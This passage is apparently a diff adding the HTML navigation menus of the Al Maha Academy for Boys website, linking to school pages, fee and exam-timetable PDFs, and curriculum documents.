+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988826"><a target="_blank" href="/wp-content/uploads/2024/10/Secondary-Assessment-Model-Years-7-12.pdf" class="elementor-sub-item">Secondary Assessment Model (Years-7-12)</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-988034"><a href="#" class="elementor-item elementor-item-anchor">School Life</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993498"><a href="https://amab.com.qa/calendar/" class="elementor-sub-item">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993760"><a href="http://amab.com.qa/wp-content/uploads/2025/08/AMAB-Lesson-Timings-AY-2025-26.pdf" class="elementor-sub-item">Daily Lesson Timings 2025-2026</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988848"><a href="https://amab.com.qa/modern-and-purpose-built-facilities/" class="elementor-sub-item">Modern &#038; Purpose-Built Facilities</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988893"><a href="https://amab.com.qa/technology-adaptation-in-teaching/" class="elementor-sub-item">Technology Adaptation in Teaching</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988905"><a href="https://amab.com.qa/science-laboratory/" class="elementor-sub-item">Science Laboratory</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988918"><a href="https://amab.com.qa/ict-laboratory/" class="elementor-sub-item">ICT Laboratory</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988933"><a href="https://amab.com.qa/library/" class="elementor-sub-item">Library</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988941"><a href="https://amab.com.qa/play-area/" class="elementor-sub-item">Play Area</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993425"><a href="https://global-zone61.renaissance-go.com/welcomeportal/2887003" class="elementor-sub-item">Star Reading</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988982"><a target="_blank" href="/wp-content/uploads/2024/10/tarbeya.pdf" class="elementor-sub-item">Tarbeya Center</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-992016 current_page_item menu-item-992018"><a href="https://amab.com.qa/news-and-events/" aria-current="page" class="elementor-sub-item elementor-item-active">News and Events</a></li>
+</ul>
+</li>
+<li class="trp-language-switcher-container menu-item menu-item-type-post_type menu-item-object-language_switcher menu-item-988990"><a href="https://amab.com.qa/ar/news-and-events/" class="elementor-item"><span data-no-translation><img class="trp-flag-image" src="/wp-content/uploads/2024/10/qatar.png" width="18" height="12" alt="ar" title="Arabic"><span class="trp-ls-language-name">AR</span></span></a></li>
+</ul>			</nav>
+					<div class="elementor-menu-toggle" role="button" tabindex="0" aria-label="Menu Toggle" aria-expanded="false">
+			<svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--open e-font-icon-svg e-fas-bars" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg><svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--close e-font-icon-svg e-eicon-close" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M742 167L500 408 258 167C246 154 233 150 217 150 196 150 179 158 167 167 154 179 150 196 150 212 150 229 154 242 171 254L408 500 167 742C138 771 138 800 167 829 196 858 225 858 254 829L496 587 738 829C750 842 767 846 783 846 800 846 817 842 829 829 842 817 846 804 846 783 846 767 842 750 829 737L588 500 833 258C863 229 863 200 833 171 804 137 775 137 742 167Z"></path></svg>			<span class="elementor-screen-only">Menu</span>
+		</div>
+					<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
+				<ul id="menu-2-828f307" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-987659"><a href="https://amab.com.qa/" class="elementor-item" tabindex="-1">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988401"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">About</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-987967"><a href="https://amab.com.qa/welcome-to-al-maha-academy-for-boys/" class="elementor-sub-item" tabindex="-1">Welcome to Al Maha Academy for Boys</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-990755"><a href="https://amab.com.qa/principals-message/" class="elementor-sub-item" tabindex="-1">Principal’s Message</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-987984"><a href="https://amab.com.qa/mission-and-vision/" class="elementor-sub-item" tabindex="-1">Mission &#038; Vision</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992965"><a href="https://amab.com.qa/governance/" class="elementor-sub-item" tabindex="-1">Governance</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988042"><a href="https://amab.com.qa/code-of-ethics/" class="elementor-sub-item" tabindex="-1">Code of Ethics</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988008"><a href="https://amab.com.qa/school-policies/" class="elementor-sub-item" tabindex="-1">School Policies</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993917"><a target="_blank" href="/wp-content/uploads/2025/04/Taallum-Curriculum_Arabic-Medium-Subjects_Ara-Eng-V.pdf" class="elementor-sub-item" tabindex="-1">Arabic Medium Subjects Curriculum</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988052"><a href="https://amab.com.qa/knowledge-centre/" class="elementor-sub-item" tabindex="-1">Learning Support Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988081"><a href="https://amab.com.qa/parents-committee/" class="elementor-sub-item" tabindex="-1">Parent’s Committee Council</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988108"><a href="https://amab.com.qa/careers/" class="elementor-sub-item" tabindex="-1">Careers</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988114"><a href="https://amab.com.qa/contact-us/" class="elementor-sub-item" tabindex="-1">Contact Us</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988126"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Infant</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988155"><a href="https://amab.com.qa/welcome-to-infant-school/" class="elementor-sub-item" tabindex="-1">Welcome to Infant School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-994093"><a href="https://amab.com.qa/infant-school-document-centre-25-26/" class="elementor-sub-item" tabindex="-1">Document Centre 25-26</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993915"><a href="https://amab.com.qa/infant-school-curriculum-and-assessments/" class="elementor-sub-item" tabindex="-1">Infant School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988175"><a href="https://amab.com.qa/infant-school-arabic-department/" class="elementor-sub-item" tabindex="-1">Infant School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988192"><a href="https://amab.com.qa/infant-school-gallery/" class="elementor-sub-item" tabindex="-1">Infant School Gallery</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988166"><a href="https://play.numbots.com/#/account/school-login/107035" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Numbots Site</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988207"><a href="https://amab.com.qa/infant-school-new-uniform/" class="elementor-sub-item" tabindex="-1">New Uniform</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988127"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Junior</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988248"><a href="https://amab.com.qa/welcome-to-junior-school/" class="elementor-sub-item" tabindex="-1">Welcome to Junior School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988259"><a href="https://amab.com.qa/junior-school-curriculum-and-assessments/" class="elementor-sub-item" tabindex="-1">Junior School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988317"><a href="https://amab.com.qa/junior-school-document-centre/" class="elementor-sub-item" tabindex="-1">Junior School Document Centre</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988295"><a href="https://amab.com.qa/junior-school-arabic-department/" class="elementor-sub-item" tabindex="-1">Junior School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988294"><a href="https://amab.com.qa/junior-school-student-council/" class="elementor-sub-item" tabindex="-1">Junior School Student Council</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988323"><a href="https://amab.com.qa/junior-school-gallery/" class="elementor-sub-item" tabindex="-1">Junior School Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988128"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Secondary</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-989363"><a href="https://amab.com.qa/welcome-to-secondary-school-2/" class="elementor-sub-item" tabindex="-1">Welcome to Secondary School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988362"><a href="https://amab.com.qa/secondary-school-curriculum-and-assessments/" class="elementor-sub-item" tabindex="-1">Secondary School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988626"><a href="https://amab.com.qa/secondary-school-document-centre/" class="elementor-sub-item" tabindex="-1">Secondary School Document Centre</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988534"><a href="https://amab.com.qa/secondary-school-arabic-department/" class="elementor-sub-item" tabindex="-1">Secondary School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988563"><a href="https://amab.com.qa/secondary-house-system/" class="elementor-sub-item" tabindex="-1">Secondary House System</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988639"><a href="https://amab.com.qa/secondary-school-gallery/" class="elementor-sub-item" tabindex="-1">Secondary School Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988653"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Admissions</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988652"><a href="https://amab.com.qa/registrars-message/" class="elementor-sub-item" tabindex="-1">Registrar’s Office</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988664"><a href="https://amab.com.qa/online-admission/" class="elementor-sub-item" tabindex="-1">Online Admission</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988667"><a href="https://amab.com.qa/registration-documentation/" class="elementor-sub-item" tabindex="-1">Registration Documentation</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994016"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-Arabic-أكاديمية-المها-للبنين-سياسة-الرسوم-2025-2026-Copy.pdf" class="elementor-sub-item" tabindex="-1">MoE Approved School Tuition Fees 2025-2026 ( Arabic)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994111"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-Fees-Policy-Updated-for-2025-2026-English.pdf" class="elementor-sub-item" tabindex="-1">School Tuition Fees Policy 2025-2026 (English))</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994113"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-MOE-Fee-Policy-and-MOE-Tablet-Mandatory-Letter-for-AY-2025-2026-2.pdf" class="elementor-sub-item" tabindex="-1">MoE Approved School Tuition Fees 2025-2026 (English))</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-988720"><a target="_blank" href="/wp-content/uploads/2024/10/MOE-AMAB-Fee-Policy-2022-2023.pdf#new_tab" class="elementor-sub-item elementor-item-anchor" tabindex="-1">MOE Fee Policy AMAB – 2024-2025</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993416"><a href="/wp-content/uploads/2024/10/Re-Enrollment-letter-2024-2025.pdf" class="elementor-sub-item" tabindex="-1">Student Re-enrollment 2024-2025</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993999"><a href="https://amab.com.qa/academic-calendar/" class="elementor-sub-item" tabindex="-1">Academic Calendar</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-988727"><a target="_blank" href="/wp-content/uploads/2024/10/2020.5.4-Withdrawal-Procedures-AMAB.pdf#new_tab" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Withdrawal Procedures</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988728"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Examinations</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994151"><a href="http://amab.com.qa/wp-content/uploads/2025/10/Taallum-Mock-Session-1b-Y12-2025-V2.pdf" class="elementor-sub-item" tabindex="-1">Year 12 IAL and AS Mock Examination 1b Timetable</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994149"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/lessons_amab_taalumgroup_com/EvUirKJiSQBOq_jkubsj-a4BorvtcNUlYwjOgK9E0B-Aeg?e=xp2N4T" class="elementor-sub-item" tabindex="-1">Year 12 Mock 1 LOs and Self-Instructional Materials</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994141"><a href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf" class="elementor-sub-item" tabindex="-1">Mid Semester 1 : 25-26 Timetable</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994140"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/lessons_amab_taalumgroup_com/EoV8WoBylZtPqJqTTRGQF_oBhkwuYZIVrwudlGcpTs-pzg?e=bCpTQb" class="elementor-sub-item" tabindex="-1">Mid Semester 1: LO&#8217;s &#038; Self-Instruction Materials</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988827"><a target="_blank" href="http://amab.com.qa/wp-content/uploads/2025/09/Appendix-1A_Taallum-Assessment-Model-Mark-Distribution.pdf" class="elementor-sub-item" tabindex="-1">Appendix 1A_Ta&#8217;allum Assessment Model &#038; Mark Distribution</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993839"><a href="http://amab.com.qa/wp-content/uploads/2025/03/AMAB-IGCSE-IAS-Summer-2025-Timetable-STUDENTS-10-11-12.pdf" class="elementor-sub-item" tabindex="-1">Summer IGCSE/AS exams timetable June 2025</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988816"><a href="https://amab.com.qa/external-exam-information/" class="elementor-sub-item" tabindex="-1">External Exam Information</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988824"><a target="_blank" href="/wp-content/uploads/2024/10/Infant-School-Assessment-Model-EYFS-Nursery-Reception.pdf" class="elementor-sub-item" tabindex="-1">Infant School Assessment (Nursery &#8211; Reception ) Model  2024-2025</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988825"><a target="_blank" href="/wp-content/uploads/2024/10/Upper-Infant-Junior-Assessment-Model-Years-1-6-.pdf" class="elementor-sub-item" tabindex="-1">Upper-Infant-Junior Assessment-Model ( Year 1-6)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988826"><a target="_blank" href="/wp-content/uploads/2024/10/Secondary-Assessment-Model-Years-7-12.pdf" class="elementor-sub-item" tabindex="-1">Secondary Assessment Model (Years-7-12)</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-988034"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">School Life</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993498"><a href="https://amab.com.qa/calendar/" class="elementor-sub-item" tabindex="-1">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993760"><a href="http://amab.com.qa/wp-content/uploads/2025/08/AMAB-Lesson-Timings-AY-2025-26.pdf" class="elementor-sub-item" tabindex="-1">Daily Lesson Timings 2025-2026</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988848"><a href="https://amab.com.qa/modern-and-purpose-built-facilities/" class="elementor-sub-item" tabindex="-1">Modern &#038; Purpose-Built Facilities</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988893"><a href="https://amab.com.qa/technology-adaptation-in-teaching/" class="elementor-sub-item" tabindex="-1">Technology Adaptation in Teaching</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988905"><a href="https://amab.com.qa/science-laboratory/" class="elementor-sub-item" tabindex="-1">Science Laboratory</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988918"><a href="https://amab.com.qa/ict-laboratory/" class="elementor-sub-item" tabindex="-1">ICT Laboratory</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988933"><a href="https://amab.com.qa/library/" class="elementor-sub-item" tabindex="-1">Library</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988941"><a href="https://amab.com.qa/play-area/" class="elementor-sub-item" tabindex="-1">Play Area</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993425"><a href="https://global-zone61.renaissance-go.com/welcomeportal/2887003" class="elementor-sub-item" tabindex="-1">Star Reading</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988982"><a target="_blank" href="/wp-content/uploads/2024/10/tarbeya.pdf" class="elementor-sub-item" tabindex="-1">Tarbeya Center</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-992016 current_page_item menu-item-992018"><a href="https://amab.com.qa/news-and-events/" aria-current="page" class="elementor-sub-item elementor-item-active" tabindex="-1">News and Events</a></li>
+</ul>
+</li>
+<li class="trp-language-switcher-container menu-item menu-item-type-post_type menu-item-object-language_switcher menu-item-988990"><a href="https://amab.com.qa/ar/news-and-events/" class="elementor-item" tabindex="-1"><span data-no-translation><img class="trp-flag-image" src="/wp-content/uploads/2024/10/qatar.png" width="18" height="12" alt="ar" title="Arabic"><span class="trp-ls-language-name">AR</span></span></a></li>
+</ul>			</nav>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-b90fb0a elementor-widget__width-auto vamtam-popup-toggle  elementor-hidden-mobile elementor-view-default elementor-widget elementor-widget-icon" data-id="b90fb0a" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6Ijk5OCIsInRvZ2dsZSI6ZmFsc2UsImFsaWduX3dpdGhfcGFyZW50IjoiIn0%3D">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-bars" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg>			</a>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-a756e73 elementor-widget__width-auto vamtam-popup-toggle  elementor-hidden-mobile elementor-view-default elementor-widget elementor-widget-icon" data-id="a756e73" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6Ijc1OTIiLCJ0b2dnbGUiOmZhbHNlLCJhbGlnbl93aXRoX3BhcmVudCI6IiJ9">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-search" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path></svg>			</a>
+		</div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-f8e21ba elementor-section-full_width elementor-hidden-desktop elementor-section-height-default elementor-section-height-default" data-id="f8e21ba" data-element_type="section" data-settings="{&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_on&quot;:[&quot;tablet&quot;,&quot;mobile&quot;],&quot;background_background&quot;:&quot;classic&quot;,&quot;sticky_offset&quot;:0,&quot;sticky_effects_offset&quot;:0}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-39e3cb3" data-id="39e3cb3" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-f853794 elementor-widget elementor-widget-theme-site-logo elementor-widget-image" data-id="f853794" data-element_type="widget" data-widget_type="theme-site-logo.default">
+				<div class="elementor-widget-container">
+											<a href="https://amab.com.qa">
+			<img fetchpriority="high" width="2800" height="1000" src="https://amab.com.qa/wp-content/uploads/2020/02/main-1.png" class="attachment-full size-full wp-image-987694" alt="main logo" srcset="https://amab.com.qa/wp-content/uploads/2020/02/main-1.png 2800w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-300x107.png 300w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-1024x366.png 1024w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-768x274.png 768w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-1536x549.png 1536w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-2048x731.png 2048w" sizes="(max-width: 2800px) 100vw, 2800px" />				</a>
+											</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-7b77874" data-id="7b77874" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-72fe41e elementor-widget-tablet__width-inherit elementor-widget-mobile__width-auto vamtam-popup-toggle  elementor-view-default elementor-widget elementor-widget-icon" data-id="72fe41e" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<a class="elementor-icon" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6Ijc1OTIiLCJ0b2dnbGUiOmZhbHNlLCJhbGlnbl93aXRoX3BhcmVudCI6IiJ9">
+			<i aria-hidden="true" class="vamtamtheme- vamtam-theme-search"></i>			</a>
+		</div>
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-61b67c5" data-id="61b67c5" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-4fb067a elementor-nav-menu--stretch elementor-widget-mobile__width-auto vamtam-popup-toggle  vamtam-has-mobile-menu-max-height elementor-nav-menu__text-align-aside elementor-nav-menu--toggle elementor-nav-menu--burger vamtam-has-mobile-disable-scroll elementor-widget elementor-widget-nav-menu" data-id="4fb067a" data-element_type="widget" data-settings="{&quot;layout&quot;:&quot;dropdown&quot;,&quot;full_width&quot;:&quot;stretch&quot;,&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;svg class=\&quot;fa-svg-chevron-down e-font-icon-svg e-fas-chevron-down\&quot; viewBox=\&quot;0 0 448 512\&quot; xmlns=\&quot;http:\/\/www.w3.org\/2000\/svg\&quot;&gt;&lt;path d=\&quot;M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z\&quot;&gt;&lt;\/path&gt;&lt;\/svg&gt;&quot;,&quot;library&quot;:&quot;fa-solid&quot;},&quot;toggle&quot;:&quot;burger&quot;,&quot;toggle_icon_active&quot;:{&quot;value&quot;:&quot;&quot;,&quot;library&quot;:&quot;&quot;}}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-menu-toggle" role="button" tabindex="0" aria-label="Menu Toggle" aria-expanded="false">
+			<svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--open e-font-icon-svg e-eicon-menu-bar" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M104 333H896C929 333 958 304 958 271S929 208 896 208H104C71 208 42 237 42 271S71 333 104 333ZM104 583H896C929 583 958 554 958 521S929 458 896 458H104C71 458 42 487 42 521S71 583 104 583ZM104 833H896C929 833 958 804 958 771S929 708 896 708H104C71 708 42 737 42 771S71 833 104 833Z"></path></svg><svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--close e-font-icon-svg e-eicon-close" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M742 167L500 408 258 167C246 154 233 150 217 150 196 150 179 158 167 167 154 179 150 196 150 212 150 229 154 242 171 254L408 500 167 742C138 771 138 800 167 829 196 858 225 858 254 829L496 587 738 829C750 842 767 846 783 846 800 846 817 842 829 829 842 817 846 804 846 783 846 767 842 750 829 737L588 500 833 258C863 229 863 200 833 171 804 137 775 137 742 167Z"></path></svg>			<span class="elementor-screen-only">Menu</span>
+		</div>
+					<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
+				<ul id="menu-2-4fb067a" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-987659"><a href="https://amab.com.qa/" class="elementor-item" tabindex="-1">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988401"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">About</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-987967"><a href="https://amab.com.qa/welcome-to-al-maha-academy-for-boys/" class="elementor-sub-item" tabindex="-1">Welcome to Al Maha Academy for Boys</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-990755"><a href="https://amab.com.qa/principals-message/" class="elementor-sub-item" tabindex="-1">Principal’s Message</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-987984"><a href="https://amab.com.qa/mission-and-vision/" class="elementor-sub-item" tabindex="-1">Mission &#038; Vision</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992965"><a href="https://amab.com.qa/governance/" class="elementor-sub-item" tabindex="-1">Governance</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988042"><a href="https://amab.com.qa/code-of-ethics/" class="elementor-sub-item" tabindex="-1">Code of Ethics</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988008"><a href="https://amab.com.qa/school-policies/" class="elementor-sub-item" tabindex="-1">School Policies</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993917"><a target="_blank" href="/wp-content/uploads/2025/04/Taallum-Curriculum_Arabic-Medium-Subjects_Ara-Eng-V.pdf" class="elementor-sub-item" tabindex="-1">Arabic Medium Subjects Curriculum</a></li>
